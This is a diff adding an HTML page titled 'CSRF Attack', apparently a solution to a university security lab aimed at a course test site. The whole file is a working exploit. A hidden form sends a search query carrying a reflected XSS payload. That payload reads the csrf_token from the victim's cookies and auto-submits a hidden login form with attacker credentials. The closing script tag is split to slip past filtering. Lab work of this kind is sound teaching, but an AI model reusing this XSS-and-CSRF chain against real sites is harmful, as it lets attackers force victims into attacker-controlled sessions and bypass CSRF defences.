@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <iframe id="searchFrame" name="CSRF_FRAME" hidden></iframe>
+    <form action="http://bungle-cs461.csl.illinois.edu/search" method="get" id="searchForm" target="CSRF_FRAME" hidden>
+        <input id="queryField" type="text" name="q" value="">
+        <input type="hidden" name="csrfdefense" value="1"/>
+        <input type="hidden" name="xssdefense" value="0"/>
+        <input type="submit" id="search-btn" value="Submit">
+    </form>
+
+    <script>
+        var payload = `
+            <iframe id='loginFrame' name='myiframe' hidden></iframe>
+            <form name='myform' id='loginForm' target='myiframe' action='./login' method='POST'>
+                <input type='hidden' name='username' value='attacker' />
+                <input type='hidden' name='password' value='l33th4x' />
+                <input type='hidden' id='csrf_token' name='csrf_token' value='0' />
+            </form>
+            <script>
+            
+                const getCookies = (str) => str.split(';').map(v => v.split('=')).reduce((acc, v) => {
+                    acc[decodeURIComponent(v[0].trim())] = decodeURIComponent(v[1].trim());
+                    return acc;
+                }, {});
+                
+                var cookies = getCookies(document.cookie);
+                document.getElementById('csrf_token').value = cookies['csrf_token'];
+                document.getElementById('loginForm').submit();
+            </scr` + `ipt>
+        `;
+
+        var searchForm = document.getElementById("searchForm");
+        document.getElementById("queryField").value = payload;
+        searchForm.submit();
+    </script>
+
+</body>
+</html>
+
